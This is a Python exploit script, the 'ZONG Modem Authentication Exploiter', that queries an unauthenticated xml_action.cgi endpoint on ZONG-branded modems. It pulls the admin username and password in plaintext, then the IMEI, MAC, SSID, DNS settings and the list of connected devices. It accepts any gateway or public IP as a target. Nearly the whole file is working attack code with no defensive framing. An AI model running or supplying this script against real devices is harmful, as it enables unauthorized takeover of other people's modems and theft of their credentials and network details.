#!/usr/bin/python

import requests,netifaces,sys,getopt

def HEADER():
   print "\n=============================================================================";
   print "=                  ZONG Modem Authentication Exploiter                      =";
   print "=============================================================================\n\n";

def FOOTER():
   print "\n\n=============================================================================";
   print "=             Exploit Developed By : Jahanzaib Khan Durrani                 =";
   print "=                 Vulnerability Found By : Osama Mehmood                    =";
   print "=============================================================================";

def main(argv):
  #VARS 
   username = None
   password = None
   gateway = None
   hw_ver = None
   dev_name = None
   devices_all = None
   ver = None
   ip_d = None
   gateway_d = None
   ssid = None
   dns1 = None
   dns2 = None
   mac = None
   #flag_of_DeviceIP
   g_flag = False


   #get command line args
   try:
      opts, args = getopt.getopt(argv,"hi:",["ip="])
   except getopt.GetoptError:
      g_flag = False
   for opt, arg in opts:
      if opt == '-h':
         print "\nUsage:\n"+__file__+' ( OPTIONAL: --ip 192.168.8.1 OR -i 192.168.8.1 or any other gateway or public IP ;) )'
         sys.exit()
      elif opt in ("-i", "--ip"):
         g_flag = True
         gateway = arg
   #include header
   HEADER()

   #check of device IP
   if(not g_flag):
      gateway = gateway = netifaces.gateways()['default'].values()[0][0]
      print "[i] Using Default GATEWAY IP: "+gateway+"\n"
   else:
      print '[i] Device IP set to: '+gateway+"\n"


   #Magic starts here ;) Abra kadabra! :D 
   r = requests.get("http://"+gateway+"/xml_action.cgi?method=get&module=duster&file=admin")
   
   if r.status_code == 200:
       print "[+] We Have a Hit!"
       
       broken_response = r.content.replace('\t','').split('\n')
       
       for response in broken_response:
           if "<router_username>" in response:
               username = response.replace('<router_username>','').replace('</router_username>','')
           if "<router_password>" in response:
               password = response.replace('<router_password>','').replace('</router_password>','')
       
       print "\nUsername of Zong Device:\n"+username+"\n"
       print "Password of Zong Device:\n"+password+"\n"

   else:
       print "[-] Device Not Vulnerable! Check GATEWAY or Device IP\n"

   print "\n=============================================================================\n";

   #trying to get more info OUT!
   r = requests.get("http://"+gateway+"/xml_action.cgi?method=get&module=duster&file=status1")
   
   if r.status_code == 200:
       print "[+] We Have a Hit again!"
       
       broken_response = r.content.replace('\t','').split('\n')
       
       for response in broken_response:
           if "<hardware_version>" in response:
               hw_ver = response.replace('<hardware_version>','').replace('</hardware_version>','').replace(' ','').replace('\n','')
           if "<known_devices_list>" in response:
               devices_all = response.replace('<known_devices_list>','').replace('</known_devices_list>','').replace('\n','')
           if "<device_name>" in response:
               dev_name = response.replace('<device_name>','').replace('</device_name>','').replace(' ','').replace('\n','')
           if "<version_num>" in response:
               ver = response.replace('<version_num>','').replace('</version_num>','').replace(' ','').replace('\n','')
           if "<ip>" in response:
               ip_d = response.replace('<ip>','').replace('</ip>','').replace(' ','').replace(' ','').replace('\n','')
           if "<gateway>" in response:
               gateway_d = response.replace('<gateway>','').replace('</gateway>','').replace(' ','').replace('\n','')
           if "<ssid>" in response:
               ssid = response.replace('<ssid>','').replace('</ssid>','').replace('\n','')
           if "<dns1>" in response:
               dns1 = response.replace('<dns1>','').replace('</dns1>','').replace(' ','').replace('\n','')
           if "<dns2>" in response:
               dns2 = response.replace('<dns2>','').replace('</dns2>','').replace(' ','').replace('\n','')
           if "<IMEI>" in response:
               imei = response.replace('<IMEI>','').replace('</IMEI>','').replace(' ','').replace('\n','')
           if "<mac>" in response and mac == None:
               mac = response.replace('<mac>','').replace('</mac>','').replace(' ','').replace('\n','')
       
       print "\nHardware Version of Zong Device:\n"+hw_ver+"\n"
       print "\nName of Zong Device:\n"+dev_name+"\n"
       print "\nSoftware Version of Zong Device:\n"+ver+"\n"
       print "\nIMEI of Zong Device!:\n"+imei+"\n"
       print "\nWiFi SSID of Zong Device:\n"+ssid+"\n"
       print "\nMAC Address of Zong Device:\n"+mac+"\n"
       print "\nIP of Zong Device:\n"+ip_d+"\n"
       print "\nGateway of Zong Device:\n"+gateway_d+"\n"
       print "\nDNS 1 of Zong Device:\n"+dns1+"\n"
       print "\nDNS 2 of Zong Device:\n"+dns2+"\n"
       print "\n=============================================================================\n";
       print "\nConnected Devies with Zong Device:\n"+devices_all+"\n"

   else:
       print "[-] Device Not Vulnerable! Check GATEWAY or Device IP\n"

   print "\n=============================================================================\n";
   
   #include footer
   FOOTER()




if __name__ == "__main__":
   main(sys.argv[1:])

